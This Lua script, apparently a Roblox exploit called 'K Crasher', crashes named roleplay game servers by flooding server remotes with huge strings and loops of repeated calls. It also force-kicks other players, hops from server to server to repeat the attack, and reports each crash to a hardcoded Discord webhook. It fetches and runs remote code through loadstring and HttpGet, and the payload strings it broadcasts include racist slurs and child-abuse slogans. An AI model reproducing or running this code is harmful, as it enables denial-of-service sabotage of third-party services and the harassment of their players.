--[[
K Crahser
Description: Crashes game
Beta: True
]]
--[[
Credits
]]
-- THIS IS IN BETA TESTING.
printconsole = printconsole or (function(...)
	warn('[K~ Debug]:',...)
end)

_G.CrashSettings = {
	Enabled = true,
	Games = {
		6520247561, -- DOJ:RP by izzy [1] 
		7261840553, -- Southern Ontario [2]
		234261816, -- Southwest Ohio [3]
		6448788420, -- Laredo Border RP [4] - no work
		7236237777, -- Victor Valley [5]
		95206881, -- Baeplate (Testing) [6],
		5012601846, -- District of Scotland [7],
		417267366, -- Dollhouse Roleplay [8], TEST
		10618406156, -- Mexico, La frontera [9] SEMI-WORK
		4618049391, -- Beta - Tang County [10]
		8551316918, -- Clayton Juvenile Detention [11]
		4787647409, -- Blacksite Zeta [12] - patched?
		6416498845, -- CL Facility Roleplay [13]
		3226555017, -- SCP: Site Roleplay [14]
		3243063589, -- Pastriez Bakery [15],
		4375619868, -- Kohaú Hibachi Restaurant [16]
	},
	WhitelistedAccounts = { -- Incase of multi crashes at once
		273336483, --RebeccaGordon3 -- idk ig banned
		336177874, -- ErinCordova2
		234227599, -- KaylaLuna2,
		3263099225, -- Daugherty52411
		3262867553, -- Brekke52438,
		3260475977, -- Kessler40546
		3256628822, -- Feeney87734 -- banned
		4177588779, -- notMiltzz -- banned
		3262990286, -- Rice48454 -- banned
		3931961529, -- BallersiKiller 
		5397348825,
		5397412913,
		5499875177, -- v7Ta6c7gLjOTM
		5499951117, -- QJ8f03NTBYJDj
		6145350623,
		6145537622,
	},
	RP_Reasons = {
		'hi',
		'help',
		'jelp',
	},
	ForceStop = false, -- Force stops the script and notifes the Discord Webhook with reason
	WebhookUrl = 'https://discord.com/api/webhooks/987129705402605609/YFwtYLn7SRZNAU0dJ-kQFgm8ag_pvpFg3R1BMyx2yeW3T9mAgCWBf11GqDXStAR4P-tl', -- Url for Discord Webhook
	--"https://discord.com/api/webhooks/987129705402605609/YFwtYLn7SRZNAU0dJ-kQFgm8ag_pvpFg3R1BMyx2yeW3T9mAgCWBf11GqDXStAR4P-tl"
	-- "https://discord.com/api/webhooks/1002971369304227980/-xic_8vFCKrMO2wzQAswikTOqxMTPD0ugs0iuGBuuG79hHuaBo-i43OIJlZk0e4HXsHf"
	WebhookSent = false, -- Checks if Discord webhook was fired or not
	TimeStarted = 0, -- The time the crashed started in "tick"
	DisableViaPos = {1,8,4,3,12} -- Disables a certain game via its current pos
}

if _G.CrashSettings.Enabled ~= true then return end
if KCLOADED == game.JobId then return task.spawn(error, 'K~ Crasher is already loaded!') end
getgenv().KCLOADED = game.JobId

-- VegaX use only!
if identifyexecutor() == "VegaX" then
	queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/CrisomoX/makeBoom/main/iodf9s8jiosiuuisodfhuihjdfuaoshsafbiasfasfasfsafas.lua'))()")
end

-- Services --
local Players = game:GetService('Players')
local TeleportService = game:GetService('Players')
local HttpService = game:GetService('HttpService')
local Marketplace = game:GetService('MarketplaceService')
local CoreGui = game:GetService('CoreGui')
local ReplicatedStorage = game:GetService('ReplicatedStorage')

local TimedStarted = _G.CrashSettings.TimeStarted
_G.TimeStarted = 0
--[[
Game Checker
Description: Checks if the game is valid and if it is disabled or not/
]]
local ValidGame = false
for i,v in pairs(_G.CrashSettings.Games) do -- Check if the game is valid and is part of list of games to crash & if the game is disabled.
	if game.PlaceId == v then
		if _G.CrashSettings.DisableViaPos[1] ~= nil then
			for _,d in pairs(_G.CrashSettings.DisableViaPos) do
				if i == d then
					return printconsole('K Crasher asked to be disabled in this part')
				end
			end
		end;
		ValidGame = true
		printconsole('K Crasher detected a game')
	end
end

if ValidGame == false then return printconsole('Debug: Not valid game') end
-- End of Game Checker --
--[[
Whitelist Checker
Description: Checks if a whitelisted user is in the game.
]]

local function DetectWU()
	for i,v in pairs(game:GetService('Players'):GetPlayers()) do
		for _, q in pairs(_G.CrashSettings.WhitelistedAccounts) do
			if v.UserId == q and (q ~= game:GetService('Players').LocalPlayer.UserId) then
				return true
			end
		end
	end
	return false
end
-- End of Whitelist Checker --
--[[
Discord Webhook
Description: Sends a discord webhook to the server
]]
local request = (syn and syn.request) or http_request or request or game:GetService('RunService'):IsStudio() --[[ Testing purposes]] or false
assert(request,'This exploit requires the request function to send Discord Webhooks');
local ForcedStopSent = false
local function RetriveGameDetails()
	if game:GetService('RunService'):IsStudio() then return end
	local ThumbnailRetriver = request({
		Url = 'https://thumbnails.roblox.com/v1/places/gameicons?placeIds='..game.PlaceId..'&size=50x50&format=Png&isCircular=false',
		Method = 'GET',
	}).Body
	local GameDetails = (function() local s, res = pcall(function() return Marketplace:GetProductInfo(game.PlaceId) end) if not s then return {Name="? - Failed to load"} else return res end end)();
	return {
		TotalPlayers = '**'..(#Players:GetPlayers())..'**',
		JobId = '**'..tostring(game['JobId'] or '?')..'**',
		GameName = '**'..GameDetails.Name..'**',
		GameIcon = (function() local s, res = pcall(function()
		return HttpService:JSONDecode(ThumbnailRetriver).data[1].imageUrl
		end)
		if not s then return "https://www.roblox.com/favicon.ico" else return res end
		end)(),
		ServerIp = '**'..tostring(_G.Server or '?')..'**',
		ExploitUsed = tostring(identifyexecutor() or 'Other'),
		AccountUsed = tostring(game:GetService('Players').LocalPlayer or '?'),
		UUID = HttpService:GenerateGUID(false)
	}
end

local function SendServerCrashed(message)
	local CrashSettings = _G.CrashSettings
	if CrashSettings.WebhookSent == true then return end
	CrashSettings.WebhookSent = true
	local CoreGameDetails = RetriveGameDetails()
	if _G.TimeStarted == nil then _G.TimeStarted = 0 end
	local Data = {
		["embeds"] = {
			{
				['title'] = CoreGameDetails.GameName,
				['description'] = 'Server information [server](https://www.roblox.com/games/'..game.PlaceId..'/)! '..CoreGameDetails.ExploitUsed..' ('..tostring(_G.LocalPlayer_Name or '?')..')',
				["fields"] = {
					{
						['name'] = 'JobId',
						['value'] = CoreGameDetails.JobId
					},
					{
						['name'] = 'Total Players',
						['value'] = CoreGameDetails.TotalPlayers,
					},
					{
						['name'] = 'Time Took',
						['value'] = '**'..tostring(tick() - _G.TimeStarted or '?')..'**',
					},
					{
						['name'] = 'Server IP',
						['value'] = CoreGameDetails.ServerIp
					},
					{
						['name'] = 'CM',
						['value'] = '**'..tostring(_G.ErrMessage or '?')..'**'
					}
				},
				["author"]= {
					["name"]= "K Crasher - Server Crashed"
				},
				["thumbnail"] = {
					["url"] = CoreGameDetails.GameIcon
				},
				["footer"] = {
					['text'] = CoreGameDetails.UUID
				},
				["timestamp"] = DateTime.now():ToIsoDate()
			}
		}
	}
	local SendToDiscord = {
		Url = _G.CrashSettings.WebhookUrl,
		Body = game:GetService("HttpService"):JSONEncode(Data), 
		Method = "POST", 
		Headers = {
			["content-type"] = "application/json"
		}
	}
	if request(SendToDiscord).Success == true then
		warn('Posted')
	else
		warn('Error')
	end
end
local function ForcedStopMessage(message)
	local CrashSettings = _G.CrashSettings
	if ForcedStopSent == true then return end
	ForcedStopSent = true

end

local function HandleTeleportRequests()
	local Ids = {}
	local TS, HS = game:GetService('TeleportService'), game:GetService('HttpService')
	local GetRequest = game:HttpGetAsync('https://games.roblox.com/v1/games/'..game['PlaceId']..'/servers/Public?sortOrder=Asc&limit=100')
	local Success, Data = pcall(function() return HS:JSONDecode(GetRequest)['data'] end)

	local retryAttempt = 0
	if not Success then
		repeat
		retryAttempt += 1
		printconsole('Retrying GetAsync Request ('..retryAttempt..')')
		GetRequest = game:HttpGetAsync('https://games.roblox.com/v1/games/'..game['PlaceId']..'/servers/Public?sortOrder=Asc&limit=100')
		Success, Data = pcall(function() return HS:JSONDecode(GetRequest)['data'] end)
		task.wait(1)
		until Success == true
	end
	
	local SavedPlaceId = game['PlaceId']
	coroutine.wrap(function()
		coroutine.wrap(function() -- Fetch new Servers
			while true do
				local success, response = pcall(function()
					GetRequest = game:HttpGetAsync('https://games.roblox.com/v1/games/'..tostring(SavedPlaceId or game.PlaceId)..'/servers/Public?sortOrder=Asc&limit=100') 
					return HS:JSONDecode(GetRequest)['data']
				end)
				if typeof(response) ~= 'table' then
					warn('Failed to fetch data', typeof(response), tostring(response))
				else
					Data = response
					--warn('Fetched new data')
				end

				for _,Server in next, Data do
					if Server['playing'] ~= nil then
						if Server['playing'] < Server['maxPlayers'] and game['JobId'] ~= Server['id'] then
							if table.find(Ids,Server['id']) then return end -- printconsole('Debug: Already in table') end							table.insert(Ids,Server['id'])
							table.insert(Ids,Server['id'])
						end
					end
				end

				--warn('Total number of servers:', #Ids)
				wait(5)
			end
		end)()

		wait(.8)

		coroutine.wrap(function()
			while true do
				local _,err = pcall(function()
					game:GetService('Players'):CreateLocalPlayer()
				end)
				if not err then
					_G.LocalPlayer2 = game:GetService('Players').LocalPlayer
				end
				wait(1)
			end
		end)()

		printconsole('Searching for new server...')
		repeat 
			local RJI = Ids[Random.new():NextInteger(1,#Ids)];
			if RJI == nil or RJI == game.JobId then 
				--warn('Nil or returned JobId [RJI]') 
			else
				printconsole(tostring(RJI))
				pcall(function()
					TS:TeleportToPlaceInstance(game['PlaceId'], RJI, _G.LocalPlayer2); 
				end) 
			end
			wait(2)
		until nil == true
	end)()
end
--[[
Teleport Script
Description: Teleports user to a new game when they get disconnected
]]
coroutine.wrap(function()
	local Players = game:GetService('Players')
	local Dir = game:GetService('CoreGui'):WaitForChild("RobloxPromptGui",math.huge):WaitForChild("promptOverlay",math.huge)
	local a = false
	Dir.DescendantAdded:Connect(function(Err)
		if Err.Name == 'ErrorMessage' then
			_G.ErrMessage = if Dir:FindFirstChild('ErrorMessage', true) then Dir:FindFirstChild('ErrorMessage', true).Text else '?'
			Err:GetPropertyChangedSignal('Text'):Connect(function()
				_G.ErrMessage = tostring(Err.Text)
				if Err.Text:find("currently unava") or Err.Text:find('no longer have acc') then
					SendServerCrashed('Joined a server which was already crashed or had problems!')
					--_G.Disconnect = true
					_G.ServerHadProblems = true
					printconsole('this server had problems. Hopping again')
				end
			end)
		end
		if Err.Name == "ErrorTitle" then
			Err = Dir:FindFirstChild(Err.Name, true) or Err
			if Err.Text:sub(0,12) == 'Disconnected' then
				if a == true then return end; a = true
				wait(.55)
				if Err.Text:sub(0, 12) == "Disconnected" then
					if _G.Disconnect ~= true then
						SendServerCrashed(tostring(_G.ErrMessage or 'Client disconnected from server or crashed server!'))
						_G.Disconnect = true
						spawn(function() while true do game:GetService('GuiService'):ClearError() task.wait() end end) -- Some games check if a ui is there and cancels teleport? Just to fix that problem.
					end	
					HandleTeleportRequests()
				end
			end
			Err:GetPropertyChangedSignal("Text"):Connect(function()
				if a==true then return end; a = true
				wait(.55)
				if Err.Text:sub(0, 12) == "Disconnected" then
					if _G.Disconnect ~= true then
						SendServerCrashed(tostring(_G.ErrMessage or 'Client disconnected from server or crashed server!'))
						_G.Disconnect = true
						spawn(function() while true do game:GetService('GuiService'):ClearError() task.wait() end end) -- Some games check if a ui is there and cancels teleport? Just to fix that problem.
					end	
					HandleTeleportRequests()
				end
			end)
		end
	end)
end)()
-- End of Teleport Script --
-- End of Discord Webhook --
--[[
Crash Methods 
Description: Methods of crashing put into functions then returned out via game id.
]]
local LongString = 'rbxassetid://'..string.rep('I rape children. K crahser on top :) gg/KyGkwTRRxD                                              ',99000) -- Tons of games are vulnerable to the Datastore/Settings exploit. Easy crash method!
local C = {}
local ReasonsRP = {
	'hi',
	'bye'
}
function C.KickUser(res)
	--	TimedStarted = tick()
	if typeof(res) == 'number' then
		game:GetService('Players').LocalPlayer:Kick('\nServer failed to crash under '..tostring(res)..' seconds!')	
	else	
		game:GetService('Players').LocalPlayer:Kick(res)
	end
end
function C.Timer()
	wait(135)
	C.KickUser(135)
end
function C.BasicSetup()
	if game.PlaceId == 8551316918 then
	else
		repeat wait() until game:IsLoaded()
	end
	if DetectWU() == true then
		_G.TimeStarted = 0
		printconsole('Another user is crashing this server. Attempting to join a new server.')
		return C.KickUser('\nAnother user is crashing this server.')
	end
	_G.CrashSettings.RP_Reasons = {
		'Someone is shooting the place',
		'Someone has a gun!',
		'a fire',
		'gun shootout',
		'yellow jack',
		'police down',
		'man with gun',
		'women with gun',
		'im scared',
		'please help',
		'someone is threat me',
		'someone hitting me',
		'gang shootout',
		'ace',
		'lady with gun',
		'girl with gun',
		'send help'
	}
	ReasonsRP = _G.CrashSettings.RP_Reasons or {'hi', 'bye'}
	_G.LocalPlayer_Name = 'nil' 
	pcall(function()
		_G.LocalPlayer_Name = tostring(game:GetService('Players').LocalPlayer.Name)
	end)
	_G.TimeStarted = tick()
	TimedStarted = _G.TimeStarted
	--C['K_'..game.PlaceId]()
end
spawn(function()
	repeat
		pcall(function()
			_G.LocalPlayer_Name = tostring(game:GetService('Players').LocalPlayer.Name)
		end)
		task.wait()
	until _G.LocalPlayer_Name ~= nil or _G.LocalPlayer_Name ~= 'nil'
end)
function C.K_6520247561() -- DOJ:RP by Sandy Shores kid (not izzy)
	printconsole('Crashing server [helping syn :)]')
	game:GetService("ReplicatedStorage").TeamChanger:FireServer('DPS');
	wait(.55)
	game:GetService("ReplicatedStorage").GameplayUIs.Radio.getCS:InvokeServer(true, '😋😋😍😎😎😎🙂😶😙😉😊😊😂🤣😃😘🥰🥰🤔🤔🤔🤔🤔😣😣😣😣😣😋😋😍😎😎😎🙂😶😙😉😊😊😂🤣😃😘🥰🥰🤔🤔🤔🤔🤔😣😣😣😣😣');
	game:GetService("ReplicatedStorage").GameplayUIs.Radio.getCS:InvokeServer(true, 'discord.gg/KyGkwTRRxD | why yall rape kids?')--Buy Synapse X https://x.synapse.to');
	game:GetService("ReplicatedStorage").GameplayUIs.Radio.send:FireServer('PRMY', '.')
	game:GetService("ReplicatedStorage").GameplayUIs.Radio.getCS:InvokeServer(true, '😋😋😍😎😎😎🙂😶😙😉😊😊😂🤣😃😘🥰🥰🤔🤔🤔🤔🤔😣😣😣😣😣😋😋😍😎😎😎🙂😶😙😉😊😊😂🤣😃😘🥰🥰🤔🤔🤔🤔🤔😣😣😣😣😣😋😋😍😎😎😎🙂😶😙😉😊😊😂🤣😃😘🥰🥰🤔🤔🤔🤔🤔😣😣😣😣😣😋😋😍😎😎😎🙂😶😙😉😊😊😂🤣😃😘🥰🥰🤔🤔🤔🤔🤔😣😣😣😣😣');
	game:GetService("ReplicatedStorage").TeamChanger:FireServer('CIVILIAN');
	wait(3)
	printconsole('Crashing server...')
	for i = 1, 6500 do
		game:GetService("ReplicatedStorage").GameplayUIs.Radio.newCall:FireServer('PD,', ReasonsRP[math.random(1,#ReasonsRP)], '.');
	end
	C.Timer()
end
function C.K_7261840553() -- Southern Ontario
	wait(5)
	printconsole('Crashing server')
	--game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(('K Crasher on top - %s bouta get crashed 🥱 gg/KyGkwTRRxD'):format(#game:GetService('Players'):GetPlayers()),'All')
	--wait(1)
	--spawn(function() workspace:FindFirstChildWhichIsA('Model'):Destroy() end)

	local PGui = game:GetService('Players').LocalPlayer.PlayerGui
	PGui.Phone.MainFrame.Background.SaveWallpaper:FireServer(LongString)
	wait(1)
	game:GetService('RunService').RenderStepped:Connect(function()
		for i = 1, 6500 do
			for i = 1, 900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 do
				PGui.Phone.MainFrame.Background.GetStoredWallpaper:InvokeServer()
			end
		end
	end)

	--[[
	game:GetService('RunService').RenderStepped:Connect(function()
	for i,v in pairs(game:GetService('Players').LocalPlayer:GetChildren()) do
    	if v:IsA('Model') then
      	v:Destroy()
    	end
   	end
   	task.wait(.1)
	end)

	for i = 1, 6500 do
	  game:GetService('Players').LocalPlayer.PlayerGui.Phone.MainFrame.Toggle.CharacterPhoneHold:FireServer(true)
	  game:GetService('Players').LocalPlayer.PlayerGui.Phone.MainFrame.Toggle.CharacterPhoneHold:FireServer(true)
	end 
	]]
	--[[
	--game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer('K Lagger on top - yall gonna get lagged 🥱 gg/KyGkwTRRxD')--:format(#game:GetService('Players'):GetPlayers()),'All')
	wait(1)
	local nigger = string.rep('﷽ ',9000)
	local PlayerGui = game:GetService('Players').LocalPlayer.PlayerGui
	PlayerGui.Phone.Message.Receive.LocalScript.Disabled = true -- Disables for less lag on the client.
	PlayerGui.PhoneInternet.Remeet.LocalScript.Disabled = true
	for i = 1,6500 do
		game:GetService("ReplicatedStorage").ManageSMS:FireServer("General", nigger);
		game:GetService("ReplicatedStorage").ManageSMS:FireServer("General", nigger);
	end
	]]
	--[[
	for i = 1, 1500 do
		game:GetService("ReplicatedStorage").ChangeTeam:FireServer('McBurger Employee');
	end
	]]
	wait(55)
	C.Timer()
end
function C.K_234261816() -- Southwest Ohio
	repeat wait() until game:IsLoaded()
	printconsole('Crashing server')

	--game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(('K Crasher on top - %s bouta get crashed 🥱 gg/KyGkwTRRxD'):format(#game:GetService('Players'):GetPlayers()),'All')

	game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)

	game:GetService("ReplicatedStorage").PurchaseCar:FireServer("2008 Pontiac G6 Coupe 3.5L");

	for i = 1, 6800 do
		game:GetService("ReplicatedStorage").SpawnCar:FireServer('2008 Pontiac G6 Coupe 3.5L');
	end
	wait(135)
	C.KickUser('\nServer failed to crash under 135 seconds!')
end
function C.K_6448788420() -- Laredo Border RP
	printconsole('Crashing server [helping syn :)]')
	wait(.85)
	game:GetService("ReplicatedStorage").GameplayUIs.Radio.getCS:InvokeServer(true, '😋😋😍😎😎😎🙂😶😙😉😊😊😂🤣😃😘🥰🥰🤔🤔🤔🤔🤔😣😣😣😣😣😋😋😍😎😎😎🙂😶😙😉😊😊😂🤣😃😘🥰🥰🤔🤔🤔🤔🤔😣😣😣😣😣');
	game:GetService("ReplicatedStorage").GameplayUIs.Radio.getCS:InvokeServer(true,'discord.gg/KyGkwTRRxD | Fuck yall niggas. | x.synapse.to')--Buy Synapse X https://x.synapse.to');
	game:GetService("ReplicatedStorage").GameplayUIs.Radio.send:FireServer('PRMY', 'K Crasher on top.')
	game:GetService("ReplicatedStorage").GameplayUIs.Radio.getCS:InvokeServer(true, '😋😋😍😎😎😎🙂😶😙😉😊😊😂🤣😃😘🥰🥰🤔🤔🤔🤔🤔😣😣😣😣😣😋😋😍😎😎😎🙂😶😙😉😊😊😂🤣😃😘🥰🥰🤔🤔🤔🤔🤔😣😣😣😣😣😋😋😍😎😎😎🙂😶😙😉😊😊😂🤣😃😘🥰🥰🤔🤔🤔🤔🤔😣😣😣😣😣😋😋😍😎😎😎🙂😶😙😉😊😊😂🤣😃😘🥰🥰🤔🤔🤔🤔🤔😣😣😣😣😣 btw this is just to hide my name of my alt lol :)');
	game:GetService("ReplicatedStorage").Remotes.TeamChanger.SwitchTeam:FireServer('Immigrants')
	wait(3)
	printconsole('Crashing Server')	
	-- Crashes server due to amount of creations and invokation of remotes.
	for i = 1, 6500 do
		game:GetService("ReplicatedStorage").GameplayUIs.Radio.newCall:FireServer('PD,', '.', '.');
	end
	C.Timer()
end	
function C.K_7236237777() -- Victor Valley 
	printconsole('Crashing server')
	for i = 1, 6500 do
		--local Target = game:GetService("ReplicatedStorage").Client.SwitchTeam;
		game:GetService("ReplicatedStorage").Client.HWID:FireServer('civ')
	end
	C.Timer()
end
function C.K_95206881() -- Baseplate / Testing server
	warn('hi world')
end
function C.K_5012601846() -- District of Striling Scotland
	printconsole('Crashing server')

	task.spawn(function()
		for i,v in pairs(workspace:GetChildren()) do
			if v:IsA('Model') or v:IsA('Part') then
				v:Destroy()
			end
		end
	end);
	--game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(('K Crasher on top - %s bouta get crashed 🥱 gg/KyGkwTRRxD'):format(#game:GetService('Players'):GetPlayers()),'All')

	for i = 1, 6500 do
		game:GetService("ReplicatedStorage").CarEvents.Spawn:FireServer("1993 Punto", BrickColor.new('Really black'), string.rep('😭',12000));
	end
	C.Timer()
end
function C.K_417267366() -- Dollhouse Roleplay
	printconsole('Crashing server')
end
function C.K_10618406156() -- Mexico, La frontera
	repeat wait() until game:IsLoaded()
	printconsole('Crashing server')

	--game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(('K Crasher on top - %s bouta get crashed 🥱 gg/KyGkwTRRxD'):format(#game:GetService('Players'):GetPlayers()),'All')

	spawn(function()
		while true do task.wait()
			for i,v in pairs(game:GetDescendants()) do
				if v:IsA('Sound') then
					v:Stop()
					v:Destroy()
				end
			end
		end
	end)

	for i,v in pairs(game.workspace:GetDescendants()) do
		if v.Name == 'AC6_FE_Sounds' and v:IsA('RemoteEvent') then
			v.Parent[v.Name]:FireServer(
				"newSound", -- Creates A New Sound
				'RamDeez', 
				game:GetService('SoundService'), -- Parent
				"rbxassetid://6829105824 ", -- Sound Id
				1, -- Pitch
				500, -- Volume
				true -- Looped
			)
			v.Parent[v.Name]:FireServer(
				"playSound",
				'RamDeez'
			)
			wait(1)
			v.Parent[v.Name]:FireServer(
				"newSound", -- Creates A New Sound
				'RamDeez', 
				game:GetService('SoundService'), -- Parent
				"rbxassetid://142376088 ", -- Sound Id
				1, -- Pitch
				500, -- Volume
				true -- Looped
			)
			v.Parent[v.Name]:FireServer(
				"playSound",
				'RamDeez'
			)
			wait()
			game:GetService('Players').LocalPlayer:Kick('Crashed game using Audio :)')
			break;

		end
	end
	wait(1)
	game:GetService('Players').LocalPlayer:Kick('Crashed game using Audio :)')
end

function C.K_4618049391() -- Beta Tang County
	printconsole('Waiting until game server is loaded...')
	repeat wait() until game:IsLoaded()
	printconsole('Kicking everyone')

	game:GetService("ReplicatedStorage").SendMessageEvent:FireServer(
	"sendmsg",
	"CHING CHONG NIGGERS! RAIDED BY THE K~ TEAM 此服务器已被 K~ 团队入侵！走吧，黑鬼们。去你的屁股。加入不和谐。儿童性骚扰 DISCORD.GG/KyGkwTRRxD",
	-2147483648
	);

	wait(5)


	for i,v in pairs(game:GetService('Players'):GetPlayers()) do
		if v.UserId ~= game:GetService('Players').LocalPlayer.UserId then
			game:GetService("ReplicatedStorage").KickPlayer:FireServer(
			v.Name,
			-2147483648
			)
		end
	end

	repeat wait() until #game:GetService('Players'):GetChildren() >= 5
	game:GetService('Players').LocalPlayer:Kick('Finsihed Kicking!')

end
function C.K_8551316918() -- Clayton Juvenile Dention

	spawn(function()

--[[
local timeBeforeStart = string.split(tostring(game.Lighting.TimeOfDay),':')[2]
printconsole(tostring(timeBeforeStart))
wait(12)
if timeBeforeStart == string.split(tostring(game.Lighting.TimeOfDay),':')[2] then
]]
		wait(12)

		local success, res = pcall(function()
			return game:GetService("ReplicatedStorage").ServerEvents.WardenEvent:InvokeServer('announce','test')
		end)

		wait(1)

		if typeof(res) ~= 'boolean' then

			pcall(function()
				game:GetService('Players'):CreateLocalPlayer()
			end)

			printconsole('Server been crashed already (Testing rn)')
			game:GetService('Players').LocalPlayer:Kick('Failed to connect to the Game. (ID = 17: Connection attempt failed.)')

			--warn(lastLoggedTimeForLighting, string.split(tostring(game.Lighting.TimeOfDay),':')[2])
		end

	end)

	local GuiService = game:GetService('GuiService')

	if UserSettings().GameSettings:InFullScreen() == true then
		GuiService:ToggleFullscreen() -- To prevent small slight errors
	end
	repeat wait() until game:IsLoaded()
	_G.LocalPlayer_Name = tostring(game:GetService('Players').LocalPlayer.Name)

	local LocalPlayer = game:GetService('Players').LocalPlayer
	local TeamsUI = LocalPlayer.PlayerGui:WaitForChild('Teams')
	TeamsUI.Enabled = true
	local Button = TeamsUI.Teams.ScrollingFrame["Detention Officer"]

	repeat wait() until LocalPlayer.Character ~= nil
	LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame = CFrame.new(477.827545, 11.8357897, 603.393005, -0.474719733, -1.15407609e-07, 0.880137026, -4.60995615e-08, 1, 1.06259861e-07, -0.880137026, 9.86972193e-09, -0.474719733)

	local SplitNum = string.split(TeamsUI.Teams.StaffCount.Text,'/')

	if SplitNum[1] == SplitNum[2] then
		printconsole('The Staff team is full! Waiting for the team to be unfull!')
		repeat
			SplitNum = string.split(TeamsUI.Teams.StaffCount.Text,'/')
			task.wait()
		until SplitNum[1] ~= SplitNum[2]
		printconsole('Staff Teams is not full anymore!')
	end

	repeat wait() until iswindowactive() == true

	wait(1)


	spawn(function()
		local event;
		function gen(len)
			local script = "K~ CRASHER ON TOP discord.gg/KyGkwTRRxD!                 !!!!"
			--local script = "LEAD DEV SMD :) discord.gg/KyGkwTRRxD!                 !!!!"
			for i=1,10 do script = script..script end
			return script
		end
		local sls = gen(10000)
		for i,v in pairs(game.workspace:GetDescendants()) do
			if v.Name == 'AC6_FE_Sounds' and v:IsA('RemoteEvent') then
				event = v
				break
			end
		end
		if event == nil then printconsole('AC6 FE SOUNDS IS NIL') end
		if event ~= nil then

			event.Parent[event.Name]:FireServer(
				"newSound", -- Creates A New Sound
				'goRapeKids', 
				game:GetService('SoundService'), -- Parent
				sls, -- Sound Id
				1, -- Pitch
				500, -- Volume
				true -- Looped
			)
			event.Parent[event.Name]:FireServer(
				"playSound",
				'goRapeKids'
			)
		end
	end)

	mousemoveabs(700,329)
	mousemoveabs(700,328)
	game:GetService('UserInputService').MouseBehavior = 2
	mouse1click(1.5)

	repeat game:GetService('RunService').RenderStepped:Wait() until LocalPlayer.Team.Name == 'Detention Officer'


	repeat wait() until LocalPlayer.Character ~= nil
	--LocalPlayer.CharacterAdded:Wait()

	game:GetService('UserInputService').MouseBehavior = 0

	repeat wait() until LocalPlayer.PlayerGui:FindFirstChild('ConfirmTeam') ~= nil

	game:GetService("ReplicatedStorage").ServerEvents.AcceptTeam:FireServer() -- So our character can move

	wait(1)
	LocalPlayer.Character:WaitForChild('AFKDetection'):Destroy()

	game:GetService("ReplicatedStorage").ServerEvents.AFKDetection:FireServer(true)
	game:GetService("ReplicatedStorage").ServerEvents.AFKDetection:FireServer(true)
	LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame = CFrame.new(-79.8962479, 1.91683292, 151.72876, -0.0260940734, -7.20886391e-08, -0.999659479, 6.18078809e-12, 1, -7.21133588e-08, 0.999659479, -1.88790983e-09, -0.0260940734)
	--LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame = workspace.GiveVestBrick.CFrame
	coroutine.wrap(function()
		local text = game:GetService('Players').LocalPlayer.PlayerGui.HeaderGui.Time.Text
		local lastLoggedTimeForLighting = '0'
		local lastLoggedTimeForTimeText = '0'
		lastLoggedTimeForLighting = string.split(tostring(game.Lighting.TimeOfDay),':')[2]
		lastLoggedTimeForTimeText = string.split(string.split(text,' ')[1],':')[2]
		local stop = false

		while stop == false do
			wait(12)--wait(19)
			if lastLoggedTimeForLighting == string.split(tostring(game.Lighting.TimeOfDay),':')[2] then
				game:GetService('Players').LocalPlayer:Kick('Server Crashed')
				warn(lastLoggedTimeForLighting, string.split(tostring(game.Lighting.TimeOfDay),':')[2])
				stop = true
			else
				lastLoggedTimeForLighting = string.split(tostring(game.Lighting.TimeOfDay),':')[2]
				lastLoggedTimeForTimeText = string.split(string.split(text,' ')[1],':')[2] 
			end
		end
	end)()

	printconsole('Crashing...')

	game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)

	for i = 1, 6500 do
		fireproximityprompt(workspace.GiveVestBrick.ProximityPrompt,0)
		fireproximityprompt(workspace.GiveVestBrick.ProximityPrompt,0)
		fireproximityprompt(workspace.GiveVestBrick.ProximityPrompt,0)
	end
	--end)

end
function C.K_4787647409() -- Blacksite Zeta
	wait(5)
	printconsole('Crashing Server')
	--game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(('K Crasher on top - %s bouta get crashed 🥱 gg/KyGkwTRRxD'):format(#game:GetService('Players'):GetPlayers()),'All')
	game:GetService("ReplicatedStorage").Remotes.Events.ChangeSettings:FireServer("JoinLeaveMessages", LongString);
	wait(1)
	game:GetService('RunService').RenderStepped:Connect(function()
		for i = 1, 6500 do
			for i = 1, 900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 do
				pcall(function()
					game:GetService("ReplicatedStorage").Remotes.Functions.GetSettings:InvokeServer()
				end)    
			end
		end
	end)

end
function C.K_6416498845() -- CL Facility Roleplay
	repeat wait() until game:IsLoaded(); task.wait(1)
	printconsole('Crashing..')
	LongString = string.rep('did u rlly even try LMAOO. K crahser on top :)                                              ',9999)

	local SettingsService;
	for i,v in pairs(game:GetService('ReplicatedStorage'):GetDescendants()) do
		if v:IsA('Folder') and v.Name == 'SettingsService' then
			SettingsService = v
			break
		end
	end

	if SettingsService == nil then
		printconsole('Error finding SettingsService')
		game:GetService('Players').LocalPlayer:Kick('SettingsService returned nil')
		return
	end

	pcall(function() game:FindFirstChild("SentryRemote",true):Destroy(); end); -- wow they logging errors brah :(
	game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)
	game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)

	printconsole('Sending requests to game server... (This may take some time)')
	--for i = 1, 2 do
--[[
{
	["Camera"] = {

	},
	["Audio"] = {
		["MusicVolume"] = 0.5
	},
	["Firearms"] = {
		["DisableExtraVisuals"] = false
	},
	["Gamepasses"] = {
		["NoArmorSpawn"] = false
	},
	["Graphics"] = {
		["DisableBlur"] = false
	},
	['Extra'] = {
	    ['Savement'] = LongString
	}
}
]]
	local core;
	local asst;
	game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge)
	spawn(function() local j = SettingsService.RF.Get:InvokeServer(); _G.um = j if not j then warn('j doesnt exist?', type(j),tostring(j):len()); end end)

